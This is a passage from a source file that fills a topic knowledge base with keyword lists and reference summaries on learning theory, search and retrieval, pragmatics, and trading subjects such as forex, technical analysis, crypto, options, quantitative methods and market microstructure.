    'Learning theories: Behaviorism (Skinner): stimulus-response, reinforcement, observable behavior. Cognitivism: information processing, mental models, schema construction. Constructivism (Piaget, Vygotsky): learners actively construct knowledge. Social constructivism: learning through social interaction. Zone of Proximal Development (ZPD): gap between what learner can do alone vs with guidance. Scaffolding: temporary support gradually removed as competence grows. Bloom\'s taxonomy: remember → understand → apply → analyze → evaluate → create. Transfer of learning: near transfer (similar contexts) vs far transfer (different contexts). Analogical reasoning: map structure from known domain (source) to new domain (target). Abstraction: extract general principles from specific examples. Generalization vs overfitting in human learning. Distributed cognition: cognitive processes spread across individuals, artifacts, and environment. Embodied cognition: body shapes mind (gestures aid thinking, physical metaphors). Situated cognition: knowledge is context-dependent. Extended mind thesis (Clark & Chalmers): external tools as part of cognitive system (notes, calculators, AI assistants).', 1.0)

  // ── Information Retrieval & Search ──────────────────────────────────────────
  add('information_retrieval', ['information retrieval search engine indexing ranking relevance', 'tf idf bm25 vector search semantic search embedding', 'inverted index posting list document frequency term frequency'],
    'Information Retrieval: Core problem — find relevant documents given a query. Inverted index: maps terms → document lists (posting lists), enables fast full-text search. TF-IDF: term frequency × inverse document frequency — measures term importance. BM25 (Okapi BM25): probabilistic ranking function, considers term frequency saturation and document length normalization, standard in search engines. Vector space model: represent queries and documents as vectors, rank by cosine similarity. Semantic search: dense retrieval using neural embeddings (BERT, Sentence-BERT), capture meaning beyond keyword match. Dense Passage Retrieval (DPR): dual-encoder for question-passage matching. Hybrid search: combine sparse (BM25) and dense (embedding) retrieval. Re-ranking: initial retrieval (fast, high recall) → re-ranking (slower, high precision, cross-encoder). Evaluation: precision, recall, F1, MAP (Mean Average Precision), NDCG, MRR (Mean Reciprocal Rank). Relevance judgments: binary, graded (0-3), crowdsourced.', 1.1)

  add('information_retrieval', ['query expansion reformulation relevance feedback pseudo', 'faceted search filtering autocomplete suggestion spelling', 'learning to rank feature extraction pairwise listwise'],
    'IR techniques: Query expansion — add related terms to improve recall. Pseudo-relevance feedback: assume top results are relevant, extract expansion terms. Explicit relevance feedback: user marks relevant/irrelevant results. Thesaurus-based: use synonym dictionaries (WordNet). Query reformulation: spelling correction, stemming, lemmatization, stop word removal. Faceted search: filter by categories (price range, color, brand). Autocomplete: prefix matching, popularity-weighted suggestions. Did-you-mean: edit distance, phonetic matching (Soundex, Metaphone). Learning to Rank (LTR): use ML to learn ranking function from labeled data. Pointwise: predict relevance score per document. Pairwise: predict which of two documents is more relevant (RankNet, LambdaRank). Listwise: optimize entire ranked list (LambdaMART, ListNet). Features: TF-IDF, BM25, PageRank, click-through rate, freshness, document quality. Neural ranking: BERT cross-encoder, ColBERT (late interaction), mono/duo-T5.', 1.1)

  add('information_retrieval', ['rag retrieval augmented generation document chunking context', 'passage retrieval context window semantic chunking overlap', 'search index elasticsearch solr lucene meilisearch typesense'],
    'Applied search & RAG: Retrieval-Augmented Generation (RAG) — retrieve relevant documents/passages, include as context for LLM generation. Steps: chunk documents → embed → index → retrieve top-K → generate with context. Chunking strategies: fixed-size (512 tokens), sentence-level, paragraph-level, semantic (by topic), recursive (split at natural boundaries). Overlap between chunks for continuity. Passage retrieval: retrieve most relevant text passages for a query. Multi-vector retrieval: ColBERT-style token-level matching. Search engines: Elasticsearch (distributed, JSON, full-text + analytics), Apache Solr (Lucene-based, enterprise search), Meilisearch (fast, typo-tolerant, developer-friendly), Typesense (instant search, faceting, geo-search). Vector databases: Pinecone, Weaviate, Milvus, Qdrant, Chroma — optimized for embedding similarity search. Indexing: ANN (Approximate Nearest Neighbor) — HNSW, IVF, PQ (Product Quantization). Hybrid: combine keyword + vector search for best results.', 1.1)

  // ── Pragmatics & Discourse Analysis ─────────────────────────────────────────
  add('pragmatics', ['pragmatics discourse analysis conversation analysis speech act', 'grice maxims cooperative principle implicature relevance', 'turn taking adjacency pair conversation structure interaction'],
    'Pragmatics & Discourse: Pragmatics — study of meaning in context, beyond literal semantics. Speech act theory (Austin, Searle): locutionary (saying), illocutionary (intended force — request, promise, assertion, directive), perlocutionary (effect on hearer). Direct vs indirect speech acts: "Can you pass the salt?" is a request, not a question about ability. Grice\'s Cooperative Principle: speakers cooperate to communicate effectively. Maxims: Quantity (be informative, not too much), Quality (be truthful, have evidence), Relation (be relevant), Manner (be clear, brief, orderly). Conversational implicature: meaning implied by violating/flouting maxims ("How was the concert?" "Well, the venue was nice" → implicates the music was bad). Discourse analysis: study of language in use beyond the sentence. Conversation analysis: turn-taking (how speakers manage who speaks when), adjacency pairs (question-answer, greeting-greeting, offer-acceptance/refusal), preference organization (preferred: acceptance; dispreferred: refusal — marked by delay, hedging). Topic management: introduction, shift, drift, closure.', 1.0)

  add('pragmatics', ['presupposition entailment inference pragmatic meaning', 'politeness theory face positive negative indirect', 'context disambiguation reference resolution deixis anaphora'],
    'Pragmatic meaning: Presupposition — information assumed to be true before utterance ("Have you stopped smoking?" presupposes you smoked). Presupposition triggers: definite descriptions, factive verbs (know, regret), change-of-state verbs (stop, begin), cleft sentences. Entailment: if P then necessarily Q (logical consequence). Implicature: implied but cancellable meaning. Scalar implicatures: "some" implies "not all", "good" implies "not excellent". Politeness theory (Brown & Levinson): positive face (desire to be liked/approved) and negative face (desire for autonomy). Face-Threatening Acts (FTAs): requests threaten negative face, criticism threatens positive face. Politeness strategies: bald on-record, positive politeness (show solidarity), negative politeness (show deference), off-record (hints, irony), don\'t do FTA. Context: physical context (where), linguistic context (co-text), social context (relationships, power), cognitive context (shared knowledge). Deixis: words whose reference depends on context — person (I, you), spatial (here, there), temporal (now, then), discourse (this, the following). Anaphora: backward-pointing reference (pronouns referring to earlier noun phrases). Cataphora: forward-pointing reference.', 1.0)

  add('pragmatics', ['coherence cohesion discourse markers connectives text structure', 'narrative structure story grammar episode schema', 'argumentation logic claim evidence warrant rebuttal'],
    'Discourse structure: Coherence — logical connectedness of text. Local coherence: adjacent sentences relate meaningfully. Global coherence: overall text structure supports main theme. Centering theory: track entity salience across sentences (backward-looking center, forward-looking centers). Cohesion (Halliday & Hasan): linguistic devices linking text — reference (pronouns, demonstratives), substitution, ellipsis, conjunction (and, but, therefore), lexical cohesion (repetition, synonymy, collocation). Discourse markers: signal relations between segments — additive (moreover, furthermore), adversative (however, nevertheless), causal (therefore, consequently), temporal (then, subsequently). Narrative structure: orientation (setting, characters), complication (conflict/events), evaluation (significance), resolution, coda (return to present). Story grammar: setting → initiating event → internal response → attempt → consequence → reaction. Argumentation structure (Toulmin model): claim (assertion), data/evidence (grounds), warrant (connects data to claim), backing (supports warrant), qualifier (degree of certainty), rebuttal (exceptions/counterarguments). Argument mining: automatically extract claims, premises, and argumentative relations from text.', 1.0)

  // ── Forex Market Analysis ──────────────────────────────────────────────────
  add('forex_analysis', ['forex market analysis currency pair major minor exotic', 'fundamental analysis economic indicator interest rate gdp employment', 'forex currency correlation hedging carry trade swap'],
    'Forex Market Analysis: Currency pairs — Major (EUR/USD, GBP/USD, USD/JPY, USD/CHF, AUD/USD, USD/CAD, NZD/USD), Minor/Cross (EUR/GBP, EUR/JPY, GBP/JPY), Exotic (USD/TRY, EUR/ZAR, USD/MXN). Pip: 0.0001 for most pairs (0.01 for JPY pairs). Lot sizes: Standard (100,000), Mini (10,000), Micro (1,000), Nano (100). Leverage: 1:30 (EU regulated) to 1:500 (offshore). Spreads: fixed vs variable, ECN vs market maker. Fundamental analysis: interest rates (central bank decisions — Fed, ECB, BOJ, BOE), GDP growth, employment data (NFP, unemployment rate), inflation (CPI, PPI), PMI (Manufacturing, Services), trade balance, consumer confidence. Economic calendar tracking. Carry trade: borrow low-yield currency, invest in high-yield (profit = interest rate differential). Currency correlation: EUR/USD and GBP/USD positive, EUR/USD and USD/CHF negative. Swap rates for overnight positions.', 1.3)

  add('forex_analysis', ['forex session market hours trading volume liquidity', 'central bank monetary policy rate decision hawkish dovish', 'forex news trading nfp cpi fomc economic event'],
    'Forex trading sessions: Sydney (22:00-07:00 GMT), Tokyo (00:00-09:00 GMT), London (08:00-17:00 GMT), New York (13:00-22:00 GMT). Overlap periods: London-New York (13:00-17:00 GMT) highest volume/volatility. Central bank analysis: Federal Reserve (USD), ECB (EUR), Bank of Japan (JPY), Bank of England (GBP), Reserve Bank of Australia (AUD), Bank of Canada (CAD), Swiss National Bank (CHF), Reserve Bank of New Zealand (NZD). Hawkish = higher rates likely (currency strengthens), Dovish = lower rates likely (currency weakens). Key events: Interest rate decisions, forward guidance statements, dot plot (Fed), quantitative easing/tightening. News trading strategies: Straddle orders before NFP/FOMC, fade the spike, wait for confirmation. Economic indicators by impact: High (interest rates, NFP, CPI, GDP), Medium (PMI, retail sales, housing), Low (trade balance, factory orders). Risk-on vs risk-off environments: risk-on favors AUD, NZD, emerging; risk-off favors USD, JPY, CHF (safe havens).', 1.3)

  add('forex_analysis', ['forex price action support resistance trend line channel', 'forex multi timeframe analysis top down weekly daily h4', 'forex intermarket analysis bonds commodities stock indices correlation'],
    'Forex analysis techniques: Price action — identify support/resistance from swing highs/lows, trend lines connecting pivot points, channels (ascending, descending, horizontal). Round number levels (1.2000, 1.2500) as psychological S/R. Multi-timeframe analysis (top-down): Weekly for major trend/bias → Daily for key levels → H4 for entry zones → H1/M15 for precise entries. Rule: trade in direction of higher timeframe trend. Intermarket analysis: USD inversely correlated with Gold (XAU/USD), positive correlation between AUD/USD and iron ore/copper prices, CAD correlates with crude oil (WTI), bond yields drive currency flows (higher yields attract capital). Stock indices as risk sentiment gauges: rising S&P 500 = risk-on. DXY (Dollar Index): weighted basket of 6 currencies vs USD (57.6% EUR, 13.6% JPY, 11.9% GBP, 9.1% CAD, 4.2% SEK, 3.6% CHF). COT report (Commitment of Traders): shows positioning of commercial hedgers, large speculators, and small speculators.', 1.2)

  // ── Technical Analysis Deep ──────────────────────────────────────────────────
  add('technical_analysis_deep', ['elliott wave theory impulse corrective wave count fibonacci', 'ichimoku cloud kinko hyo tenkan kijun senkou chikou', 'fibonacci retracement extension golden ratio 0.618 0.382 1.618'],
    'Advanced Technical Analysis — Elliott Wave Theory: Markets move in predictable wave patterns. Impulse waves (5-wave structure: 1-2-3-4-5 in trend direction) and corrective waves (3-wave A-B-C counter-trend). Rules: Wave 2 never retraces beyond start of Wave 1; Wave 3 is never the shortest impulse wave; Wave 4 doesn\'t overlap Wave 1 price territory. Wave degrees: Grand Supercycle → Supercycle → Cycle → Primary → Intermediate → Minor → Minute → Minuette → Sub-Minuette. Ichimoku Kinko Hyo (5 components): Tenkan-sen (Conversion Line, 9-period midpoint), Kijun-sen (Base Line, 26-period midpoint), Senkou Span A (midpoint of Tenkan+Kijun, plotted 26 ahead), Senkou Span B (52-period midpoint, plotted 26 ahead), Chikou Span (Close plotted 26 back). Cloud (Kumo) = area between Senkou Span A and B. Fibonacci: 0.236, 0.382, 0.5, 0.618, 0.786 retracement levels; 1.0, 1.272, 1.618, 2.0, 2.618 extension levels. Golden ratio (φ = 1.618) derived from Fibonacci sequence.', 1.3)

  add('technical_analysis_deep', ['supply demand zone order block smart money concept', 'harmonic pattern gartley butterfly bat crab abcd', 'volume profile point of control value area market profile'],
    'Advanced TA methods — Smart Money Concepts (SMC): Institutional order flow analysis. Order blocks: last candle before a strong move (institutional entry). Breaker blocks: failed order blocks. Fair value gaps (FVG/imbalance): price gaps between 3-candle sequence. Liquidity: stop-loss clusters above swing highs (buy-side) and below swing lows (sell-side). Market structure: break of structure (BOS), change of character (CHoCH). Optimal trade entry (OTE): 0.62-0.79 Fibonacci zone. Harmonic patterns (Scott Carney): Gartley (XA-AB 61.8%, BC 38.2-88.6%, CD 78.6%), Butterfly (AB 78.6%, CD 127.2-161.8%), Bat (AB 38.2-50%, CD 88.6%), Crab (AB 38.2-61.8%, CD 161.8%), ABCD pattern (AB=CD in price/time, BC 61.8-78.6% of AB). Volume Profile: Point of Control (POC, highest volume price), Value Area High/Low (VAH/VAL, 70% of volume), High Volume Nodes (HVN, consolidation), Low Volume Nodes (LVN, rejection). TPO (Time Price Opportunity) charts for market profile.', 1.3)

  add('technical_analysis_deep', ['wyckoff method accumulation distribution spring upthrust', 'pivot points camarilla fibonacci woodie floor', 'divergence hidden regular rsi macd stochastic momentum'],
    'Advanced TA systems — Wyckoff Method: Market phases — Accumulation (institutional buying at lows): PS, SC, AR, ST, Spring, SOS, LPS, BU/SOS. Distribution (institutional selling at highs): PSY, BC, AR, ST, UTAD, SOW, LPSY. Composite Man concept: market controlled by large operators. Three laws: Supply/Demand, Cause/Effect, Effort/Result. Pivot Points: Floor (traditional): PP=(H+L+C)/3, R1=2*PP-L, S1=2*PP-H, R2=PP+(H-L), S2=PP-(H-L). Camarilla: tighter levels using multipliers (0.0916, 0.183, 0.275, 0.55). Fibonacci: PP=(H+L+C)/3, levels use Fib ratios (0.382, 0.618, 1.0). Woodie: PP=(H+L+2*C)/4 (more weight on close). Divergence types: Regular bullish (price lower low, indicator higher low — reversal up), Regular bearish (price higher high, indicator lower high — reversal down), Hidden bullish (price higher low, indicator lower low — continuation up), Hidden bearish (price lower high, indicator higher high — continuation down). Apply to RSI, MACD histogram, Stochastic, CCI, OBV.', 1.3)

  // ── Cryptocurrency Trading ───────────────────────────────────────────────────
  add('crypto_trading', ['cryptocurrency trading bitcoin ethereum altcoin blockchain', 'defi decentralized finance yield farming liquidity pool amm', 'crypto exchange cex dex order book spot futures perpetual'],
    'Cryptocurrency Trading: Major assets — Bitcoin (BTC, digital gold, 21M supply cap, halving every 210K blocks), Ethereum (ETH, smart contract platform, EVM, proof-of-stake since The Merge). Altcoins: Layer-1s (SOL, AVAX, ADA, DOT), Layer-2s (ARB, OP, MATIC), DeFi tokens (UNI, AAVE, MKR), Memes (DOGE, SHIB). DeFi (Decentralized Finance): Automated Market Makers (AMM: Uniswap, SushiSwap) — x*y=k constant product formula. Liquidity pools: provide token pairs, earn fees + impermanent loss risk. Yield farming: deposit tokens for yield (APY/APR), compounding strategies. Lending protocols: Aave, Compound — supply assets to earn interest, borrow against collateral. Exchanges: CEX (Binance, Coinbase, Kraken — custodial, order book, KYC), DEX (Uniswap, dYdX, Jupiter — non-custodial, on-chain). Trading types: Spot (buy/sell actual assets), Futures (contracts with expiry), Perpetual swaps (no expiry, funding rate mechanism).', 1.2)

  add('crypto_trading', ['on chain analysis blockchain metrics whale tracking transaction', 'crypto tokenomics supply schedule vesting inflation deflation', 'nft non fungible token mint marketplace collection trading'],
    'Crypto analysis methods — On-chain analytics: UTXO analysis (unspent transaction outputs), active addresses (network growth), exchange inflows/outflows (selling/accumulation pressure), whale wallet tracking (wallets >1000 BTC), mining metrics (hash rate, difficulty, miner revenue), realized cap vs market cap (MVRV ratio). Tools: Glassnode, Nansen, Dune Analytics, DefiLlama, Etherscan. Tokenomics: supply metrics — total supply, circulating supply, max supply. Inflation/deflation mechanisms: ETH burn (EIP-1559), BTC halving. Vesting schedules: team/investor token unlock timelines (cliff, linear vesting). Token utility: governance, staking, fee payment, access rights. NFT trading: ERC-721/ERC-1155 standards, marketplaces (OpenSea, Blur, Magic Eden), collection analysis (floor price, volume, unique holders, blue chip index). Minting strategies, rarity tools, trait analysis. Gas optimization for NFT operations.', 1.2)

  add('crypto_trading', ['crypto risk management leverage liquidation funding rate', 'crypto market cycle bitcoin halving altcoin season dominance', 'stablecoin usdt usdc dai peg mechanism arbitrage'],
    'Crypto risk management: Leverage in crypto — perpetual futures allow 1x-125x leverage. Liquidation price = entry ± (margin / position size). Funding rate: periodic payment between longs and shorts to anchor perpetual price to spot (positive = longs pay shorts, negative = shorts pay longs). Cross margin vs isolated margin. Maximum position size: limit to 2-5% of portfolio per trade. Market cycles: Bitcoin halving cycle (~4 years) — accumulation → markup → distribution → markdown. Altcoin season: capital rotates from BTC to alts when BTC dominance falls. Crypto Fear & Greed Index as sentiment gauge. Stablecoins: fiat-backed (USDT/Tether, USDC/Circle), algorithmic (DAI/MakerDAO with collateralized debt positions), decentralized (LUSD). De-peg risks: USDT reserve concerns, algorithmic stability failures (Terra/UST collapse). Arbitrage: spot-futures basis trade, cross-exchange price differences, DEX-CEX arbitrage, funding rate arbitrage. Security: hardware wallets (Ledger, Trezor), seed phrase management, smart contract audit risks.', 1.2)

  // ── Options & Derivatives Trading ────────────────────────────────────────────
  add('options_derivatives', ['options trading call put strike price expiration premium', 'options greeks delta gamma theta vega rho sensitivity', 'options strategy covered call protective put iron condor spread'],
    'Options Trading fundamentals: Options contract — right (not obligation) to buy (Call) or sell (Put) underlying asset at strike price before/on expiration date. Premium = Intrinsic Value + Time Value. Intrinsic: max(0, Spot-Strike) for calls, max(0, Strike-Spot) for puts. In-the-money (ITM), At-the-money (ATM), Out-of-the-money (OTM). Exercise styles: American (exercise anytime), European (exercise at expiry only). Options Greeks: Delta (Δ): rate of price change vs underlying (0 to 1 calls, -1 to 0 puts). Gamma (Γ): rate of delta change. Theta (Θ): time decay (negative for buyers). Vega (ν): sensitivity to implied volatility. Rho (ρ): sensitivity to interest rates. Common strategies: Covered Call (own stock + sell call), Protective Put (own stock + buy put), Bull Call Spread (buy lower call + sell higher call), Bear Put Spread (buy higher put + sell lower put), Iron Condor (sell OTM put + buy further OTM put + sell OTM call + buy further OTM call).', 1.2)

  add('options_derivatives', ['options pricing black scholes model implied volatility skew', 'futures contract margin initial maintenance mark to market', 'derivatives swap interest rate credit default forex forward'],
    'Options pricing & Derivatives: Black-Scholes model: C = S·N(d1) - K·e^(-rT)·N(d2), where d1 = [ln(S/K) + (r + σ²/2)T] / (σ√T), d2 = d1 - σ√T. Assumptions: log-normal distribution, constant volatility, no dividends, European-style. Implied Volatility (IV): market\'s expectation of future volatility, derived by inverting Black-Scholes. IV Skew/Smile: OTM puts typically have higher IV (demand for protection). VIX: CBOE Volatility Index (market "fear gauge"), calculated from S&P 500 option prices. Futures: standardized contracts to buy/sell asset at future date. Margin: Initial (deposit to open position), Maintenance (minimum to keep position), Mark-to-Market (daily P&L settlement). Contango (futures > spot, typical) vs Backwardation (futures < spot). Derivatives: Interest Rate Swaps (exchange fixed for floating rates), Credit Default Swaps (CDS, insurance against default), Currency Forwards (lock exchange rate), Commodity Futures (oil, gold, agricultural).', 1.2)

  add('options_derivatives', ['options advanced straddle strangle butterfly calendar diagonal', 'options volatility trading iv crush earnings event', 'options risk management position sizing portfolio greeks hedge'],
    'Advanced options strategies: Straddle (buy call + put same strike): profits from big moves either direction, high premium cost. Strangle (buy OTM call + OTM put): cheaper than straddle, needs bigger move. Butterfly (buy 1 lower + sell 2 middle + buy 1 higher): low cost, max profit at middle strike. Calendar/Time Spread (sell near-term + buy same-strike longer-term): profit from time decay differential. Diagonal Spread: different strikes AND expirations. Iron Butterfly: sell ATM straddle + buy OTM strangle wings. Volatility trading: Buy straddles/strangles before earnings expecting IV expansion, sell after expecting IV Crush (post-event IV collapse). IV Rank: current IV relative to 52-week range. IV Percentile: % of days with lower IV. Options risk management: Portfolio Delta/Gamma/Theta/Vega exposure. Delta-neutral strategies: hedge directional risk. Gamma scalping: adjust delta hedge as underlying moves. Max loss/gain calculation for each strategy. Position sizing: risk max 1-2% of portfolio per trade. Assignment risk for short options near expiration.', 1.2)

  // ── Quantitative Trading ─────────────────────────────────────────────────────
  add('quantitative_trading', ['quantitative trading strategy alpha signal factor model', 'statistical arbitrage pairs trading cointegration mean reversion', 'backtesting framework walk forward optimization overfitting cross validation'],
    'Quantitative Trading: Alpha generation — finding signals that predict future returns. Factor models: momentum (past winners continue winning), value (low P/E outperform), quality (high ROE, low debt), size (small caps outperform), volatility (low-vol premium). Multi-factor models: combine signals with linear/nonlinear weighting. Signal processing: z-score normalization, winsorization (clip outliers), neutralization (sector/beta neutral). Statistical Arbitrage: Pairs trading — find cointegrated pairs (Engle-Granger test, Johansen test), trade the spread. Entry: z-score > 2 (short spread), z-score < -2 (long spread). Exit: z-score returns to 0. Mean reversion: Ornstein-Uhlenbeck process, half-life estimation. Backtesting: Walk-forward optimization (in-sample train → out-of-sample test → roll forward). Cross-validation: k-fold on time series (purged/embargo to prevent leakage). Overfitting detection: compare in-sample vs out-of-sample Sharpe, multiple testing correction (Bonferroni, FDR), deflated Sharpe ratio. Frameworks: Zipline, Backtrader, QuantConnect, Lean.', 1.2)

  add('quantitative_trading', ['market making high frequency trading low latency colocation', 'execution algorithm twap vwap implementation shortfall iceberg', 'risk model value at risk var expected shortfall monte carlo'],
    'Quantitative execution & risk: Market Making — continuously quote bid/ask, profit from spread. Inventory risk management: skew quotes based on position (wider spread on side with excess inventory). HFT infrastructure: colocation (servers in exchange data center), FPGA/ASIC hardware, kernel bypass networking, direct market access (DMA). Latency: nanosecond-level tick-to-trade. Execution Algorithms: TWAP (Time-Weighted Average Price): spread order evenly over time. VWAP (Volume-Weighted Average Price): match historical volume profile. Implementation Shortfall (IS): minimize deviation from decision price, balance market impact vs timing risk. Iceberg: show small visible quantity, hide large order. POV (Percentage of Volume): execute as fraction of market volume. Dark pools: anonymous trading venues for large orders. Risk models: Value at Risk (VaR) — maximum expected loss at confidence level (95%, 99%) over time horizon. Methods: Historical simulation, Parametric (variance-covariance), Monte Carlo simulation. Expected Shortfall (CVaR): average loss beyond VaR threshold. Stress testing: historical scenarios (2008 crisis, COVID crash), hypothetical scenarios.', 1.2)

  add('quantitative_trading', ['machine learning trading feature engineering prediction model', 'alternative data sentiment satellite social media trading signal', 'portfolio optimization mean variance efficient frontier sharpe ratio'],
    'ML in trading & Portfolio theory: Machine learning for alpha: Feature engineering — technical indicators, price patterns, volume features, cross-asset signals, microstructure features. Models: Random Forest (robust, interpretable), XGBoost/LightGBM (gradient boosting, top in competitions), LSTM/GRU (sequential price data), Transformer models (attention-based). Target: next-day returns, direction classification, volatility prediction. Challenges: non-stationarity, low signal-to-noise ratio, regime changes, survivorship bias. Alternative data: satellite imagery (parking lot occupancy, crop yields), social media sentiment (Twitter, Reddit, StockTwits), web scraping (job postings, product reviews), credit card transaction data, geolocation data. NLP: earnings call transcript analysis, news sentiment (VADER, FinBERT). Portfolio optimization: Markowitz Mean-Variance — maximize return for given risk (efficient frontier). Sharpe ratio = (Rp - Rf) / σp. Black-Litterman model: combine market equilibrium with investor views. Risk parity: equal risk contribution from each asset. Kelly criterion: optimal bet sizing f* = (p·b - q) / b.', 1.2)

  // ── Trading Psychology ───────────────────────────────────────────────────────
  add('trading_psychology', ['trading psychology emotional discipline fear greed bias', 'trading mindset patience consistency routine journal', 'cognitive bias overconfidence loss aversion recency anchoring'],
    'Trading Psychology: Emotional management — Fear (missing out FOMO, losing money, being wrong) and Greed (overtrading, overleveraging, not taking profits). Discipline: follow your trading plan regardless of emotions. Key biases: Overconfidence (overestimating skill after wins, increasing position size), Loss aversion (Kahneman: losses hurt 2x more than equivalent gains feel good, leads to holding losers too long), Recency bias (weighting recent events disproportionately, e.g., expecting continued trend after streak), Anchoring (fixating on entry price rather than current market conditions), Confirmation bias (seeking information that supports existing position, ignoring contrary signals), Disposition effect (selling winners too early, holding losers too long), Gambler\'s fallacy (believing past outcomes affect independent future events). Trading journal: record entry/exit, strategy, setup, emotions, market conditions, screenshots. Review weekly for patterns. Consistent routine: pre-market analysis, watchlist preparation, defined trading hours, post-session review. Patience: wait for A+ setups only, quality over quantity.', 1.1)

  add('trading_psychology', ['risk management position sizing percent risk fixed fractional', 'trading plan rules entry exit criteria checklist systematic', 'trading performance metrics win rate risk reward expectancy'],
    'Risk management psychology: Position sizing methods — Fixed Fractional (risk X% per trade, typically 1-2%), Fixed Dollar Amount (constant risk per trade), Kelly Criterion (optimal but aggressive: f* = W - (1-W)/R where W=win rate, R=avg win/avg loss, use half-Kelly for safety). Risk per trade: never risk more than 2% of account on single trade. Total portfolio heat: max 6-10% total open risk. Correlation risk: avoid multiple positions in correlated assets. Trading plan components: market selection (which instruments), timeframe(s), setup criteria (specific patterns/signals), entry rules (exact trigger), stop-loss rules (where and why), take-profit rules (targets, trailing stops), position size calculation, maximum trades per day/week, drawdown rules (stop trading after X% drawdown). Performance metrics: Win Rate (% of winning trades), Risk-Reward Ratio (average win / average loss), Expectancy = (Win% × Avg Win) - (Loss% × Avg Loss), Profit Factor = Gross Profit / Gross Loss (>1.5 good, >2.0 excellent), Sharpe Ratio (risk-adjusted return), Maximum Drawdown (peak-to-trough decline), Recovery Factor (net profit / max drawdown).', 1.1)

  add('trading_psychology', ['market regime trend range volatile quiet adapting strategy', 'trading mistakes revenge trading overtrading moving stop loss', 'professional trader habits screen time deliberate practice edge'],
    'Adaptive trading psychology: Market regimes — Trending (directional moves, use momentum/trend-following strategies), Ranging (sideways, use mean-reversion/support-resistance), Volatile (wide swings, reduce size or use options), Quiet/Low-vol (tight ranges, avoid or use breakout strategies). Regime identification: ADX (>25 trending), ATR (volatility measure), Bollinger Band width (squeeze = low vol). Adapt strategy to current regime, don\'t force trades. Common mistakes: Revenge trading (increasing size after losses to recover), Overtrading (taking subpar setups from boredom/FOMO), Moving stop-loss further (hoping trade recovers, increasing risk), Averaging down without plan (adding to losing position), Not taking profits (greed), Trading during news without strategy, Ignoring trading plan. Professional habits: Defined screen time (avoid over-watching), deliberate practice (review trades, study patterns, paper trade new strategies), trading edge identification (specific, measurable advantage), continuous journaling and review, physical health (exercise, sleep, breaks), accepting losses as cost of business, process-oriented (focus on execution, not P&L), mentor/community for accountability.', 1.1)

  // ── Market Microstructure ────────────────────────────────────────────────────
  add('market_microstructure', ['order book depth bid ask spread market maker liquidity', 'order flow tape reading level 2 time and sales footprint', 'market impact slippage execution quality fill rate'],
    'Market Microstructure: Order book — collection of limit orders at various price levels. Bid (highest buy price), Ask/Offer (lowest sell price), Spread = Ask - Bid. Depth of Market (DOM/Level 2): shows quantity at each price level. Liquidity: abundance of resting limit orders, tight spreads, low impact. Thin markets: wide spreads, large price moves from small orders. Market makers: provide continuous two-sided quotes, profit from spread, manage inventory risk. Order types: Market (immediate execution, pays spread), Limit (specify price, may not fill), Stop (triggered at price, becomes market order), Stop-Limit (triggered at price, becomes limit order), Iceberg/Reserve (only show portion of total size). Order flow analysis: Tape reading — monitor Time & Sales (prints of executed trades). Distinguish aggressive buying (trades at ask) from aggressive selling (trades at bid). Delta = buy volume - sell volume at each price. Footprint charts: visualize buying/selling pressure per candle. Cumulative delta: running sum indicates buyer/seller control. Volume-weighted price analysis: identify accumulation/distribution zones.', 1.1)

  add('market_microstructure', ['market structure venue exchange dark pool alternative trading', 'auction mechanism opening closing price discovery continuous', 'order routing smart order execution best execution regulation'],
    'Market venue structure: Exchanges — regulated venues with central order book (NYSE, NASDAQ, LSE, CME). Electronic Communication Networks (ECN): match buy/sell orders electronically. Dark pools: anonymous trading venues (no pre-trade transparency), used for large institutional orders to minimize market impact. Internalization: broker fills order from own inventory. Payment for Order Flow (PFOF): brokers route retail orders to market makers who pay for the flow (Citadel Securities, Virtu). Auction mechanisms: Opening auction — collect orders pre-market, determine opening price (max volume matched). Closing auction — final price for settlement/indices. Continuous trading: matches orders throughout the day in price-time priority. Price discovery: process by which market determines fair value. Best Execution: regulation requiring brokers to obtain best possible result for clients (MiFID II in EU, SEC in US). Factors: price, speed, likelihood of execution, cost, size. Smart Order Routing (SOR): algorithms that search across multiple venues for best execution. Order routing optimization: minimize latency, maximize fill rate, reduce market impact. Reg NMS (US): prohibits trade-throughs, requires price protection across venues.', 1.1)

  add('market_microstructure', ['high frequency trading latency arbitrage flash crash', 'market manipulation spoofing layering wash trading pump dump', 'electronic market making spread capture inventory management'],
    'Advanced microstructure: HFT strategies — Statistical arbitrage (exploit tiny price discrepancies across venues, microsecond holding periods), Latency arbitrage (race between venues when prices diverge, speed advantage), Market making (automated bid-ask quoting, capture spread, manage inventory with hedging), Event-driven (react to news/data releases faster than competitors). Infrastructure: colocation, cross-connects, microwave/laser links between exchanges, FPGA-based order processing. Flash crashes: May 2010 (Dow dropped 1000 points in minutes), caused by cascading sell algorithms and thin liquidity. Circuit breakers: halt trading when price moves exceed thresholds (Level 1: 7%, Level 2: 13%, Level 3: 20% for S&P 500). Market manipulation (illegal): Spoofing — placing orders with intent to cancel before execution to create false impression of demand. Layering — multiple spoof orders at different levels. Wash trading — simultaneously buying and selling same asset to inflate volume. Pump and dump — artificially inflate price through promotion then sell. Front-running — trading ahead of known upcoming large orders. Surveillance: exchange monitoring, regulator oversight (SEC, CFTC, FCA), pattern detection algorithms.', 1.1)

  // ── Portfolio Management ──────────────────────────────────────────────────────
  add('portfolio_management', ['portfolio management asset allocation strategic tactical dynamic', 'modern portfolio theory markowitz efficient frontier diversification', 'rebalancing portfolio drift threshold calendar tax loss harvesting'],
    'Portfolio Management: Asset allocation — distribution across asset classes. Strategic allocation: long-term target weights based on risk tolerance and goals (e.g., 60/40 stocks/bonds). Tactical allocation: short-term deviations to exploit opportunities. Dynamic allocation: adjust based on market conditions/indicators. Asset classes: Equities (domestic, international, emerging), Fixed Income (government bonds, corporate, high-yield), Real Assets (real estate/REITs, commodities, infrastructure), Alternatives (hedge funds, private equity, venture capital), Cash/Money Market. Modern Portfolio Theory (Markowitz): investors are risk-averse, choose portfolio on efficient frontier (maximum return for given risk). Efficient frontier: set of optimal portfolios. Diversification: reduce unsystematic risk by combining uncorrelated assets. Beta: measure of systematic risk relative to market. Alpha: excess return above benchmark. Rebalancing: restore portfolio to target weights. Methods: Calendar-based (quarterly, annually), Threshold-based (rebalance when allocation drifts >5%), Hybrid. Tax-loss harvesting: sell losing positions to offset gains, reinvest in correlated but non-identical assets (wash sale rule: 30-day wait).', 1.1)

  add('portfolio_management', ['risk parity all weather permanent portfolio equal weight', 'factor investing smart beta momentum value quality size', 'etf exchange traded fund index fund passive investing'],
